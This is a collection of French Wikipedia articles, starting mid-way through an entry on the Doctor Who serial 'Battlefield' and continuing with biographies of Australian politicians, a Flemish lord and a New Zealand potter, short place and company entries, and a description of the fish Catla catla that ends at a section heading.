L'épisode devait à l'origine avoir un personnage nommé Lavender Warmington, dirigeant un groupe nommé le "Carbury Trust" et l'amie asiatique d'Ace était nommée Thaï. Le scénario devait inclure Ace brandissant un tout nouveau tournevis sonique et celle-ci devait être capturée par Morgaine qui prévoyait de la sacrifier pour invoquer un puissant démon. Le Brigadier devait être mortellement blessé en combattant le démon, ce qui aurait provoqué sa disparition, Bambera devait tuer Mordred afin de sauver Ancelyn et A'tur, ressuscité, obtenait l'obéissance de Morgaine. La première partie ayant été commissionnée le 16 septembre 1988, de nombreux éléments furent changés : les personnages changèrent de noms, Lavender Warmington devint le personnage de Peter Warmsly, le tournevis sonic fut abandonné et le Brigadier devait mourir après avoir tué le démon avec Excalibur. L'épisode connu tour à tour les noms de “Pool Of Avallion” () “Song Of Avallion” () et “Stormtroopers Of Avallion” ()
Au début de l'année 1989 le scénario évolua. L'épisode s'intitula “The Battlefield” que Cartmel raccourcie en "Battlefield." De plus celui-ci et Nathan-Turner trouve que l'épisode est rempli de trop d'événements et pensent que la mort héroïque du Brigadier risque d'en être amoindrie. Après avoir envisagé qu'il reparte avec les chevaliers dans l'autre dimension, Aaronovitch s'arrête sur une fin où il rentre mener une vie paisible. Le démon, qui devait changer d'apparence, repart sur des bases plus simples. Il s'agira du dernier scénario d'Aaronovitch pour la série.
Tournage.
Après avoir hésité à faire revenir Graeme Harper puis Nicholas Mallett, le réalisateur choisi pour tourner l'épisode fut Michael Kerrigan, un réalisateur ayant tourné pour les séries "The Baker Street Boys", "Dramarama" et "Knights Of God." Il s'agit de sa seule réalisation pour la série mais sera amené à tourner deux épisodes de la série dérivée de "Doctor Who" "The Sarah Jane Adventures." À l'origine, l'épisode devait être tourné en avril, mais à la suite d'indisponibilités d'agenda de Nicholas Courtney, il fut décalé au mois de mai et fut le deuxième épisode de la saison à être tourné.
Le tournage débuta par la réalisation des plans en extérieurs le 6 au mai 1989 à Fulmer dans le Buckinghamshire pour les plans situés dans la maison du brigadier, ainsi que les plans d'hélicoptère. Le tournage se poursuivit par les plans à l'extérieur du QG de Morgaine , le 7 mai à St Martin Without dans le Lincolnshire puis les plans à l'extérieur de l'hôtel, le 8 à Rutland dans le Leicestershire. Deux journées de tournages le 9 et le 10 furent ajournés à la suite d'un mouvement de grève. Le 13 et 14 mai eurent lieu le tournage de différentes scènes de route dans les environs de Rutland et de Colsterworth, ainsi que la scène près du mémorial, le 15 mai à l'extérieur de l'église St Andrew de Rutland. Le 11, puis les 15 et 17 mai furent tournées les scènes aux alentours du lake Vortigen, toujours à Rutland. À l'origine, les chevaliers devaient porter des armures à mi-chemin entre la combinaison futuriste et l'armure traditionnelle, mais cela fut abandonné pour des raisons de coûts.
La première session de tournage en studio eut lieu sur trois jours du 30 mai au juin 1989, malgré un autre mouvement de grève qui retarda les répétitions. Les deux premiers jours de tournages se concentrèrent sur les scènes dans la ferme, dans l'hôtel ainsi que dans le TARDIS. Les murs du décor de celui-ci ayant été accidentellement détruits après le tournage de "The Greatest Show in the Galaxy", il fut décidé que celui-ci soit plongé dans le noir afin de ne pas avoir à le reconstruire, le reste de la saison ne nécessitant pas d'autres scènes à l'intérieur du vaisseau.
Le juin, les scènes dans la brasserie, les tunnels et le vaisseau spatial furent tournées. Le tournage devait se terminer avec la scène où Ace est piégée à l'intérieur d'un sas se remplissant progressivement d'eau. Toutefois, la vitre possédait un défaut et commençait à craquer sous la pression. Sylvester McCoy s'en rendit compte lors du tournage et alerta l'équipe en utilisant un juron que le Docteur n'était pas censé utiliser. Sophie Aldred fut sortie juste avant que la vitre n'éclate et n'eut qu'une blessure superficielle à la main. Des vidéos de ce tournage furent réutilisées par la BBC afin de montrer les erreurs à ne pas faire.
Post-production.
Dans une scène coupée, le Docteur citait à Ace la troisième loi de Clarke expliquant qu'une technologie suffisamment avancée est parfois indistinguable de la magie, afin d'expliquer les rituels et les sorts appliqués par Morgaine.
Diffusion et réception.
La diffusion de la nouvelle saison de Doctor Who se fit pour la troisième année consécutive le mercredi, face au soap-opéra d'ITV "Coronation Street" bien plus forte en termes d'audience. Le 11 septembre 1989, John Nathan-Turner appris que la série ne serait pas reconduite à l'antenne l'an prochain.
Critiques.
En 1995, les auteurs du livre "Doctor Who : The Discontinuity Guide", jugent que l'épisode fonctionne en tant qu'épisode d'action avec une scène finale charmante, même si le tout manque d'explications immédiates. Les auteurs de "Doctor Who : The Television Companion" (1998) quant à eux, estiment que l'épisode est décevant, ce qui coince lorsqu'une saison est composée de seulement quatre épisodes. Ils trouvent les batailles de chevaliers risibles notamment pour une civilisation avancée, que l'épisode comporte bien trop de personnages et que la musique est assez décevante. Toutefois, ils apprécient le jeu de Jean Marsh ainsi que la complexité du personnage de Morgaine, le design du Destructeur et le retour d'UNIT.
En 2012, Patrick Mulkern de "Radio Times" donne un avis négatif sur l'épisode, estimant qu'avec autant de bons éléments, le tout se montre décevant. Il estime, lui aussi, qu'il y a trop de personnages mais apprécie le retour du Brigadier et les allusions aux saisons des années 1970. Sa critique est accompagnée d'articles de l'époque.
Novélisation.
L'épisode fut romancé par Marc Platt sous le titre de "Battefield" et publié en juillet 1991. Illustré par une couverture d'Alister Pearson, il porte le numéro 152 de la collection « Doctor Who » des éditions Target Books. Le roman commence avec un prologue dans lequel le futur Docteur "Merlin" emmène le Roi Arthur, blessé, à bord du vaisseau spatial se trouvant sous le lac. Il comporte plus d'information sur la nouvelle équipe de U.N.I.T. ainsi que sur la dimension d'où vient Morgaine. La fin du roman change avec celle de l'épisode, puisque le Brigadier repart avec les chevaliers dans leur dimension afin de restaurer leur ordre.
Il s'agit du dernier épisode télévisé de "Doctor Who" à avoir été publié en petit format depuis leur apparition en 1973. Ce roman n'a jamais été traduit à ce jour.
Éditions commerciales.
L'épisode n'a jamais été édité en France, mais a connu plusieurs éditions au Royaume-Uni et dans les pays anglophones. 

</doc>
<doc id="9412358" url="https://fr.wikipedia.org/wiki?curid=9412358" title="Centre interdisciplinaire de recherche en opérationnalisation du développement durable">
Centre interdisciplinaire de recherche en opérationnalisation du développement durable

Le Centre interdisciplinaire de recherche en opérationnalisation du développement durable (CIRODD) est un centre de recherche basé à Montréal, au Québec et fondé en 2013.
Description.
Issu du Fonds québécois de la recherche sur la nature et les technologies (FRQNT) et du Fonds québécois de recherche société et culture (FRQSC), le CIRODD est le premier regroupement stratégique en développement durable au Québec.
Le CIRODD regroupe plus de quatre-vingts professeurs-chercheurs de 11 universités, de trois cégeps et de deux centres de transfert technologique. Ces chercheurs œuvrent dans les domaines de l'analyse du cycle de vie, de la responsabilité sociale des entreprises, de la réingénierie des procédés, du génie des procédés, des politiques et de la législation de l'environnement, de l'écoconception, de la symbiose industrielle, de la logistique verte, de la mesure et de l'analyse de la durabilité, de l'économie verte et de l'innovation durable.
La mission du CIRODD est de « réaliser, coordonner, intégrer et transférer les recherches en opérationnalisation du développement durable dans l'objectif ultime de faciliter l'émergence d'une économie verte ».

</doc>
<doc id="9412359" url="https://fr.wikipedia.org/wiki?curid=9412359" title="Gérard de Zottegem">
Gérard de Zottegem

Gérard de Zottegem ou Sottegem est un seigneur Flamand connu pour sa participation à la guerre entre Philippe le Bel, roi de France, et Gui de Dampierre, comte de Flandre, les seigneurs et les villes du comté de Flandre entre 1297 et 1305. Il fait partie des représentants flamands désignés par le comte de Flandre pour négocier les trêves et une paix définitive avec le roi. Les négociations aboutissent au Traité d'Athis de la Saint-Jean 1305.
Gérard de Zottegem est un seigneur possessionné dans la région d'Alost, à proximité de Gand. Son mariage avec Marie, vicomtesse de Gand, lui permet de devenir châtelain de la ville, capitale des comtes de Flandre, et à ce titre, il participe à la guerre contre le roi dans le camp de Gui de Dampierre. En 1300, il échange ce château contre celui de Saeftinghe, situé lui aussi dans les environs de Gand.
Le , il est chargé par Robert de Béthune, fils de Gui de Dampierre, avec Jean de Cuyck, Jean de Gavres et Gérard le Moor, d'entamer des négociations avec le roi de France visant à proclamer des trêves puis s'accorder sur un traité de paix, à la suite de la victoire royale à Mons-en-Pévèle le et de la mise en place du siège de Lille le . Par la suite, il participe avec les trois autres seigneurs flamands aux négociations de paix avec les personnages désignés par le roi pour le représenter : Louis, comte d'Evreux et frère cadet de Philippe le Bel, Amédée, comte de Savoie, Robert, duc de Bourgogne et Jean, comte de Dreux. En , il accompagne Jacques de Saint-Aubert et Hugues de La Celle, envoyés par Philippe le Bel pour recevoir le serment des nobles et des bourgeois des principales villes de Flandre de ratifier et respecter le traité de paix à venir. Il assiste notamment à la prestation de serment des brugeois le , en présence de trois des fils du comte Gui, Philippe de Thiette, Jean et Henri de Namur. Il est présent deux jours plus tard avec les mêmes princes à Gand où se reproduit la même cérémonie qu'à Bruges. À la Saint-Jean 1305 (vers le ), à Athis, Gérard de Zottegem scelle l'acte de paix, dans lequel il est mentionné comme négociateurs, avec les trois autres plénipotentiaires flamands et les quatre français. Les flamands et notamment les brugeois refusant de ratifier le traité d'Athis, de nouvelles négociations sont entamées et le , Robert de Béthune renouvelle ses pouvoirs à Gérard de Zottegem et ses compagnons. Celles-ci aboutissent en au traité de Paris.

</doc>
<doc id="9412360" url="https://fr.wikipedia.org/wiki?curid=9412360" title="Mike Baird">
Mike Baird

Michael Bruce Baird dit Mike Baird, né le à Melbourne, est un homme politique australien, Premier ministre de la Nouvelle-Galles du Sud du au .

</doc>
<doc id="9412362" url="https://fr.wikipedia.org/wiki?curid=9412362" title="Len Castle">
Len Castle

Leonard Ramsay « Len » Castle (Auckland, – ) est un potier et photographe néo-zélandais.
Biographie.
Né à Auckland en 1924, Castle a obtenu un à l'université d'Auckland en 1946 et a poursuivi des études de professeur. Il a obtenu un poste de lecteur à l'. Sa première expérience de la poterie remonte à ses dix ans, lorsqu'il a assisté à une démonstration d' à la foire de Pâques d'Auckland. Castle a réalisé sa première poterie en 1947 et pris des cours avec Robert Nettleton Field à à Auckland. En 1956, il a passé un an à St Ives en Cornouailles pour travailler avec Bernard Leach, et il est devenu potier à plein temps en 1963. La même année, il a participé à la fondation de la Société des potiers de Nouvelle-Zélande.
Au début des années 1960, il s'est fait construire une maison d'architecte dans le bush des chaînes Waitakere, à Titirangi (au 20 Tawini Road), avec un four et une voie ferrée derrière, ainsi qu'une cave basse lui permettant d'exposer ses œuvres. La famille qui lui a succédé a détruit le four.
Au début des années 1950, Castle avait fait la connaissance du graveur et photographe , qui a décoré la surface des pots pétris et cuits par Castle. Dans les années 1960, Schoon lui a fait découvrir les zones géothermiques du centre de l'île du Nord. Castle a beaucoup photographié les paysages de cette région, qui se reflètent aussi dans sa poterie.
Castle a étudié la céramique au Japon, en Corée et en Chine en 1966–67. Il a cité Shoji Hamada comme l'une de ses influences. En 1972-1973, il s'est fait construire une nouvelle maison au sud de Titirangi, avec un plus grand four, alimenté par une voie ferrée plus importante, et qui est toujours utilisé. En 1989, il a fait partie des céramistes et verriers néo-zélandais sélectionnés pour l'exposition du pavillon de la Nouvelle-Zélande à l'Exposition universelle de Séville de 1992. Celle-ci se trouve maintenant au Musée national Te Papa Tongarewa.
Castle est mort le .
Récompenses.
En 1986, Castle a été fait commandeur de l'ordre de l'Empire britannique pour ses services à la poterie. Quatre ans plus tard, il a reçu la Médaille commémorative 1990 de Nouvelle-Zélande. Il a été nommé pour services à la poterie dans la promotion du nouvel an 2004. En 2009, il a refusé la transformation de son titre en (chevalier compagnon) lorsque le gouvernement a rétabli l'aspect nobiliaire de l'ordre (qui avait été aboli en 2000).
En 2003, Castle a reçu l', la plus haute récompense décernée par l'.
', édité par , a reçu en 2003 un pour les œuvres non fictionnelles. Six ans plus tard, ', édité par la d'Auckland, a remporté le pour la meilleure œuvre non fictionnelle illustrée.

</doc>
<doc id="9412366" url="https://fr.wikipedia.org/wiki?curid=9412366" title="Enusa">
Enusa

Enusa Industrias Avanzadas SA, ou simplement Enusa est l'entreprise publique espagnole qui conçoit, produit et distribue du combustible nucléaire pour les centrales nucléaires espagnoles et des centrales de pays étrangers.
Présentation.
L'entreprise Enusa a été créée en 1972, à l'époque sous le nom Empresa Nacional del Uranio SA.
C'est une entreprise publique détenue à 60 % par la Sociedad Estatal de Participaciones Industriales (SEPI) qui dépend du ministère espagnol de l'Économie et de la Compétitivité et à 40 % par le Centre de recherche énergétique, environnemental et technologique (CIEMAT) qui dépend lui du ministère espagnol de la Science et de l'Innovation. La conception et la fabrication du combustible est assurée par une usine installée à Juzbado dans la province de Salamanque (Castille-et-León).

</doc>
<doc id="9412369" url="https://fr.wikipedia.org/wiki?curid=9412369" title="John Storey (homme politique)">
John Storey (homme politique)

John Storey, né le à Huskisson et mort le à Darlinghurst, est un homme politique australien premier ministre de la Nouvelle-Galles du Sud du au .

</doc>
<doc id="9412371" url="https://fr.wikipedia.org/wiki?curid=9412371" title="Huskisson (Australie)">
Huskisson (Australie)

"'Huskisson" est une ville d'Australie, située en Nouvelle-Galles du Sud dans la ville de Shoalhaven. La population en 2006 s'élève à 778 personnes.

</doc>
<doc id="9412374" url="https://fr.wikipedia.org/wiki?curid=9412374" title="Lagunilla (Castille-et-León)">
Lagunilla (Castille-et-León)

Lagunilla est une commune de la province de Salamanque dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9412375" url="https://fr.wikipedia.org/wiki?curid=9412375" title="Ledesma (commune)">
Ledesma (commune)



</doc>
<doc id="9412380" url="https://fr.wikipedia.org/wiki?curid=9412380" title="James Dooley">
James Dooley

James Dooley, né le dans le comté de Longford en Irlande et mort le en Nouvelle-Galles du Sud, est un homme politique australien premier ministre de la Nouvelle-Galles du Sud du au et du au .

</doc>
<doc id="9412381" url="https://fr.wikipedia.org/wiki?curid=9412381" title="George Fuller (homme politique australien)">
George Fuller (homme politique australien)

George Fuller, né le à Kiama et mort le à Darlinghurst, est un homme politique australien premier ministre de la Nouvelle-Galles du Sud le et du au .

</doc>
<doc id="9412383" url="https://fr.wikipedia.org/wiki?curid=9412383" title="Alexander Mair">
Alexander Mair

Alexander Mair (25 août 1889 – 3 août 1969) était un homme politique australien qui a été premier ministre de la Nouvelle-Galles du Sud du 5 août 1939 au 16 mai 1941. Né à Melbourne, Mair a travaillé dans diverses entreprises avant de déménager à Albury, en Nouvelle-Galles du Sud, où il a été membre de l’Assemblée législative de la Nouvelle-Galles du Sud pendant quatorze ans. En 1932, Mair fut élu au siège d’Albury et réélu quatre fois. Il se hisse rapidement dans le cabinet du gouvernement du Parti uni d’Australie de Bertram Stevens, devenant ministre adjoint en avril 1938, ministre du Travail et de l’Industrie en juin et trésorier colonial en octobre.
Fervent partisan de Stevens tout au long de son mandat comme premier ministre, Mair devint son successeur en août 1939, après la défaite de Stevens dans une motion de censure présentée par le ministre renégat, Eric Spooner. Devenu Premier ministre à un moment difficile pour le gouvernement, Mair a été marquée par son unification de son parti anciennement agité, le renforcement des dépenses gouvernementales et des impôts pour réduire la dette, et de nouvelles lois du travail pour réduire le chômage. Lorsque la Seconde Guerre mondiale éclate en septembre 1939, Mair mobilise l’État en faveur de l’effort de guerre mais trouve difficile de communiquer son message aux électeurs. Il est premier ministre jusqu’à ce qu’il perde l’élection de mai 1941 au profit du Parti travailliste sous William McKell, perdant 20 sièges.
Resté chef de l’opposition, avec l’effondrement de l’UAP, Mair est devenu chef du nouveau Parti démocratique et a participé aux négociations pour unir les partis conservateurs brisés et former le Parti libéral en 1945. Lorsque Reginald Weaver mourut en novembre 1945, quelques mois seulement après être devenu le premier chef du Parti libéral en Nouvelle-Galles du Sud, Mair fut choisi pour lui succéder. Mair demeura à la tête du parti jusqu’à sa démission en mars 1946 pour se présenter au Sénat australien. Sans succès, il se retira à Melbourne, où il mourut en 1969, à l’âge de 79 ans.
Enfance.
Alexander Mair est né le 25 août 1889 dans la banlieue de Melbourne de North Carlton, Victoria, l’aîné des parents victoriens Alexander Mair, marchand de bois et d’acier, et son épouse Florence Mair (née Hunter). Mair fit ses études au Wesley College, où il excella dans le sport, puis au Bradshaw Business College. [4] À la fin de ses études, Mair travailla dans l’entreprise de son père, Alexander Mair &amp; Co., où il était marchand de bois, de fer et d’acier. Le 29 octobre 1913, Mair épouse Grace Lennox à l’église écossaise de Melbourne et a deux fils, John et Sandy, et une fille, Margaret.
Lorsque son père mourut aussi cette année-là, Mair prit la direction de l’entreprise, qui se transforma en quincaillerie. Il s’est impliqué dans toutes les facettes de l’entreprise, visitant souvent des fournisseurs étrangers. Cependant, un accès de grippe dans l’épidémie de 1919 et l’asthme subséquent l’a amené progressivement à se retirer des affaires. En 1922, il vendit la cour d’acier, puis, en 1925, le reste des actifs de la compagnie à James McEwan &amp; Co. Pty Ltd, dont il fut administrateur jusqu’en 1927. [3] En 1928, Mair achète 'Rockwood', une propriété de pâturage à l’extérieur d’Albury, en Nouvelle-Galles du Sud, où les Mairs élèvent des moutons et des bovins ainsi que des céréales.
Début de carrière politique.
Mair entra pour la première fois en politique aux élections du 11 juin 1932, lorsqu’il se présenta comme candidat du Parti uni d’Australie pour le siège local d’Albury à l’Assemblée législative de la Nouvelle-Galles du Sud. La campagne électorale a été remarquée peu de temps après la destitution du premier ministre Jack Lang et a été touchée par la violence de la Nouvelle Garde de droite. Malgré cela, Mair a obtenu le siège du membre du parti travailliste, Joseph Fitzgerald. Bien qu’il n’ait obtenu que 30,65 % des suffrages primaires contre 40,07 % de Fitzgerald, Mair a réussi à obtenir le siège avec les préférences des pays-parties, avec une marge de 58 à 41 %.
À titre de député local, Mair s’intéressa à aider les personnes touchées par la Grande Dépression et remplit sa promesse électorale de donner la majeure partie de son salaire parlementaire aux pauvres de son propre électorat, pratique qu’il continua jusqu’en 1938. [6] Membre de l’arrière-ban, Mair était reconnu comme un ardent défenseur du premier ministre Bertram Stevens à une époque où la discipline de parti au sein de l’UAP était inexistante. Mair se bâtit bientôt une réputation de député loyal, mais aussi fortement indépendant, et de puissant débatteur à la Chambre.
Aux élections de mai 1935, Mair est réélu à son siège avec une marge de 59,03%. En 1937, il se rend en Grande-Bretagne avec sa femme pour le couronnement du roi George VI et tente plus tard d’entrer en Union soviétique, dans le but d’étudier les problèmes sociaux associés à un système communiste, comme marin sur un navire norvégien, mais on lui refuse l’entrée.
Ministre de la Couronne.
Aux élections de mars 1938, Mair fut réélu avec une marge légèrement réduite de 57,76 %. [9] Toutefois, à cette occasion, Mair est nommé ministre adjoint du nouveau cabinet du premier ministre Stevens le 13 avril 1938. Il occupa ce poste pendant dix semaines, jusqu’au 1er juin 1938, année où il fut promu ministre du Travail et de l’Industrie, poste qui avait été libéré par la mort de son prédécesseur, John Dunningham. Bien qu’il n’ait occupé ce portefeuille que pendant une courte période, Mair connut beaucoup de succès et acquit la réputation de comprendre et de comprendre les points de vue des travailleurs, ce qui permit de résoudre plusieurs conflits de travail.
Il servit jusqu’au 13 octobre, date à laquelle le premier ministre Stevens le promut trésorier colonial. Dès son entrée en fonction, Mair a immédiatement proposé des réductions drastiques des dépenses pour rétablir l’équilibre budgétaire et trouver de nouvelles sources de revenus fiscaux. Dans ce cadre, il a publié une circulaire à tous les ministres du gouvernement pour déclarer toute dépense de plus de £3000 au Trésor pour approbation. Tous se sont conformés, sauf le leader adjoint et ministre des Travaux publics et des Gouvernements locaux, Eric Spooner, qui a cherché à miner la confiance dans le leadership de Stevens. En juillet 1939, Stevens et Mair tentèrent d’empêcher les tactiques perturbatrices de Spooner en créant un comité de quatre personnes, composé de Mair, Stevens, Spooner et du chef du parti national, Michael Bruxner, pour approuver toutes les dépenses. Furieux de ce geste, Spooner démissionna le 21 juillet 1939 de ses fonctions de ministre et de leader adjoint, invoquant comme motif un 'désaccord dans la politique gouvernementale sur les secours'.
Le 1er août 1939, Spooner adopta une motion de défiance à l’endroit de Stevens, motion qui, de façon inattendue, fut adoptée par deux voix en raison de l’absence de plusieurs ministres. Le 3 août, Stevens remit sa démission au gouverneur, lord Wakehurst, mais on lui accorda plusieurs jours pour rester jusqu’à ce que son successeur soit choisi. Après sa démission, Spooner a été présenté comme le successeur possible de Stevens jusqu’à ce que le vice-premier ministre Bruxner refuse de former un gouvernement de coalition avec Spooner, qui s’opposait à l’influence du Country Party, tandis que Stevens tentait d’obtenir l’appui de Mair. Lors d’une réunion du parti, le 5 août, Spooner choisit de ne pas proposer de candidat et Mair défait Athol Richardson par 18 voix contre 6, devenant chef du United Australia Party et fut assermenté comme premier ministre par lord Wakehurst le même jour.
Premier ministre de la Nouvelle-Galles du Sud.
Héritant d’un gouvernement de plus en plus dysfonctionnel et d’une situation financière qui se détériorait, Mair lutta rapidement contre la désunion du parti, mais rétablit les comités d’orientation des députés d’arrière-ban qui étaient tombés en désuétude sous Stevens. Mair convoqua régulièrement des réunions du parti et sa manière conciliante ne tarda pas à unir son parti autrefois dysfonctionnel. C’est cette discipline de parti et cette unité qui devaient caractériser le premier ministre Mair. [14] En identifiant plusieurs domaines clés de réforme, Mair s’est efforcé de lutter contre la situation économique en augmentant fortement les impôts, mais a également prévu qu’une certaine proportion des capitaux générés par les salaires et l’impôt sur le revenu soit consacrée au chômage et à l’aide sociale. D’autres modifications ont été apportées à la Loi sur la location immobilière, à l’aide aux clubs de course de pays et à la prestation de mesures de santé et de sécurité dans les mines de charbon. [15] Malgré cela, Mair resta fidèle à l’ancien chef Bertram Stevens. Lors de son discours à Albury le 14 août, il a déclaré : "Ce que j’ai appris sous sa direction compétente sera mis au profit de la Nouvelle-Galles du Sud."
Mair remania considérablement son cabinet, annonçant le nouveau ministère le 16 août. Parmi les nominations figuraient Athol Richardson comme trésorier colonial, Lewis Martin assuma les anciens rôles de Spooner aux Travaux publics et aux Administrations locales et le relativement nouveau Vernon Treatt comme ministre de la Justice. [14] Face à une population de 53.000 chômeurs inscrits, le 30 août, Mair a fait des plans pour lutter contre le chômage des jeunes en offrant de généreux régimes de retraite aux mineurs de charbon et en instaurant la retraite obligatoire à 60 ans, réduisant ainsi de moitié le taux de chômage. Malgré les tentatives de rassurer les spéculations commerciales sur le déclenchement de la guerre, le 3 septembre 1939, la Seconde Guerre mondiale éclata. À la réunion du cabinet le lendemain, Mair, ses deux fils s’étant enrôlés, réaffirma la nécessité de soutenir la Grande-Bretagne et les Alliés. Mair assuma personnellement cette responsabilité en accordant £4000 en prêts de guerre. En décembre, le gouvernement de Mair a refusé d’enregistrer les médecins allemands réfugiés et Mair a par la suite critiqué le Premier ministre Robert Menzies pour ne pas avoir interné des étrangers ennemis. Lorsque le Parlement a repris ses travaux en mars 1940, le chef de l’opposition, William McKell, a présenté une motion de censure contre le gouvernement, invoquant son inefficacité à lutter contre le chômage et le logement. Mair a répondu en déchirant leurs arguments dans un discours d’une heure et demie.
Le choix de Mair au poste de ministre de la Justice Vernon Treatt s’est avéré problématique lorsqu’il a été allégué qu’il avait agi pour réduire les amendes imposées à certaines entreprises qui avaient vendu du pain de mauvaise qualité au ministère de la Défense. En dépit d’une commission royale qui a innocenté Treatt de tout acte répréhensible, la confiance du public dans le gouvernement Mair avait chuté. Lors de la campagne électorale du 10 mai 1941, Mair se débrouilla mal, ne se distinguant guère de son prédécesseur et proposant des politiques, mais ne promettant qu’une action après la guerre. McKell’s Labor Party a fait le contraire, laissant les questions de guerre au gouvernement fédéral et promettant les réformes actuelles. Aux élections, le Parti travailliste a obtenu plus de la moitié des suffrages, tandis que le Parti national de Bruxner a perdu neuf sièges et l’UAP de Mair a perdu vingt sièges : douze pour le Parti travailliste, sept pour les indépendants et un pour la redistribution. [18] Mair a lui-même conservé son siège avec 52,47 %. Les forces politiques conservatrices ne reprendront le pouvoir qu’en 1965, sous Robert Askin.
Fin de carrière.
Opposition.
Mair devint chef de l’opposition des partis conservateurs brisés le 19 mai 1941 et, malgré la défaite électorale, il s’engagea à soutenir pleinement le gouvernement en matière de guerre. Cependant, avec les très mauvais résultats du Parti fédéral d’Australie-Unie sous Billy Hughes aux élections fédérales de 1943, l’UAP s’est désintégré. Un grand nombre d’anciens membres de l’UAP ont ensuite formé le Parti démocratique en Nouvelle-Galles du Sud, dirigé par Mair, tandis que d’autres sont passés au Parti du Commonwealth et au Parti libéral démocrate. Le Parti démocrate fusionne ensuite avec le Parti du Commonwealth en janvier 1944. [20] Avec le vote conservateur divisé en deux, Mair a eu peu de chance, et a démissionné comme chef du Parti démocratique le 10 février 1944, pour être remplacé par le chef adjoint Reginald Weaver, qui est ensuite devenu chef de l’opposition, Mair devenant chef adjoint. [21] Weaver et Mair ont mené les forces conservatrices désespérément divisées à la défaite aux élections du 27 mai 1944, perdant trois autres sièges. C’était aussi la dernière élection d’Etat contestée par Mair, dont il conservait son siège pour la dernière fois avec 53,06%.
Après la défaite électorale, Mair a joué un rôle central dans les négociations visant à fusionner les partis conservateurs pour former le nouveau Parti libéral de Robert Menzies, devenir délégué à la Conférence de Canberra en octobre 1944 et accueillir la deuxième conférence du parti à son siège à Albury au Mate Department Store. Malgré les premiers efforts pour fusionner le Parti Démocratique avec le Parti Libéral Démocratique devenant dans l’impasse sur les questions d’organisation du parti et par l’acrimonie entre Weaver et le chef du LDP, Ernest K White, ils ont finalement réussi et le Parti libéral est né au début de 1945. [23] Membre de l’exécutif libéral de la Nouvelle-Galles du Sud de 1945 à 1946, lorsque le chef du premier parti Weaver meurt subitement le 12 novembre 1945, Mair est choisi pour lui succéder.
Il n’est que brièvement devenu le deuxième chef du Parti libéral de la Nouvelle-Galles-du-Sud, jusqu’à ce qu’il démissionne de son poste de chef le 21 mars 1946.Son ancien ministre de la Justice, Vernon Treatt, lui succède. Le 14 août 1946, après avoir servi quatorze ans au Parlement de la Nouvelle-Galles du Sud, Mair a démissionné de son siège pour se présenter au Sénat australien pour la Nouvelle-Galles du Sud. [15] Lors des élections fédérales du 28 septembre 1946, le Parti libéral est défait et n’obtient aucun siège au Sénat en vue d’une élection, car le système électoral jusqu’aux élections de 1949 tend à donner tous les sièges dans chaque État au parti qui obtient le plus de votes.
Après la politique.
Mair se retira de la politique et retourna dans sa propriété d’Albury, mais fut témoin de la perte de son ancien siège au profit du Parti travailliste à l’élection partielle du 9 novembre. Cependant, Mair aida à retourner son siège au Parti libéral aux élections de mai 1947. En 1948, il vendit Rockwood.
De retour à Melbourne en 1949, Mair a occupé divers postes d’affaires et d’organisation, notamment en tant que membre du conseil d’administration de l’hôpital dentaire de Melbourne, conseiller national de la Young Men’s Christian Association, Vice-président du Royal Victorian Institute for the Blind et vice-président du Guide Dogs for the Blind.Le 12 janvier 1949, le roi George VI, sur l’avis du gouverneur de la Nouvelle-Galles du Sud, John Northcott, lui accorda le titre "L’Honorable" à vie, pour avoir siégé pendant plus de trois ans au Conseil exécutif de la Nouvelle-Galles du Sud.
Près d’un quart de siècle après avoir quitté le Parlement, Mair mourut le 3 août 1969 dans sa maison de St Kilda, laissant sa femme, ses deux fils et sa fille.

</doc>
<doc id="9412386" url="https://fr.wikipedia.org/wiki?curid=9412386" title="Catla catla">
Catla catla

La Catla (Gibelion "catla" Hamilton 1822) est le nom hindi, bengali, finnois et anglais d'une espèce de poisson essentiellement d'Asie, proche de la carpe, qui appartient à la famille des Cyprinidés. Elle est aussi nommée « bhakur » en Hindi, « Baudhekera », « Baudhekra » et « Bhakua » en assamais, « katol » en bengali, « Pla kra ho » et « Theila » au Pakistan, « Taylee » en russe...
Dans l'économie mondiale elle fait partie des plus importantes espèces de poissons.
Taxonomie.
La catla est le seul membre du genre Catla et est liste sous le nom de "Gibelion catla" dans FishBase. Cependant le "Catalog of Fishes" hébergé par l'académie des Sciences de Californie indique le genre "'Gibelion" comme genre valide.
Aire de répartition.
Poisson d'Asie, elle est endémique du nord de l'Inde, de la plaine de l'Indus et des zones voisines au Pakistan, au Bangladesh, au Népal et en Birmanie. Par la suite elle a été introduite dans tout le reste de l'Inde ainsi qu'en Chine où elle est là aussi abondamment présente, notamment parce qu'il se reproduit en rivière, sur place, et que ses œufs sont donc disponibles sur place pour développer son élevage en point d'eau fermé, dans les régions proches des rivières qu'elle fréquente. Sa distribution géographique naturelle semble dépendre de la température (il lui faut un minimum de ) plus que de la longitude ou la latitude. L'espèce a également été introduite à Sri Lanka, en Israël, au Japon, et en 1960 dans les îles Maurice pour des expériences de polyculture avec l'écrevisse.
Caractéristiques.
Description.
Le dos et les flancs de la catla sont plus ou moins gris ; son ventre est blanc argenté.
La tête ne porte pas d'écailles. La bouche est grande et tournée vers le haut. 
La mâchoire inférieure s'allonge vers l'avant, avec une articulation à la symphyse mandibulaire (à l'emplacement du menton) mais sans proéminence (sans "bosse"). 
La lèvre inférieure est épaisse, par opposition à une lèvre supérieure quasi absente. Les dents pharyngiennes sont distribuées sur trois rangées, selon une disposition 5-3-2 / 2-3-5.
Les yeux sont larges et sont visibles depuis le dessous de la tête.
Les nageoires pectorales sont longues, s'étendant presque jusqu'aux nageoires pelviques. 
La nageoire dorsale a 14 à 16 ou 17 rayons mous (non-osseux) dorsaux et s'insère légèrement plus en avant que les nageoires pelviques.
La nageoire anale, plutôt courte, est composée de 7 à 8 rayons mous. Il n'y a pas d'épines anales. 
La nageoire caudale est assez courte et fourchue.
Les écailles sont notablement grandes et plutôt arrondies. La ligne latérale porte de 40 à 43 écailles.
Le plus grand poids connu est , et la plus grande longueur connue est . Sa croissance est rapide, avec une moyenne de acquis en 10 mois.
Habitat.
La catla se trouve en eau douce et en eau saumâtre (estuaires, lagunes...) mais c'est essentiellement un poisson de rivière (potamodrome) et de lacs. Son échelle de température ambiante va de à avec un minimum à – c'est un poisson subtropical. Elle est benthopélagique, c'est-à-dire qu'on la trouve aussi bien près du fond (le benthos est l'ensemble des organismes aquatiques vivant à proximité du fond) que de la surface (là où le pélagos se trouve) ; la profondeur moyenne à laquelle elle se tient est de ., mais elle évolue sur toute la hauteur de la colonne d'eau.
Nourriture.
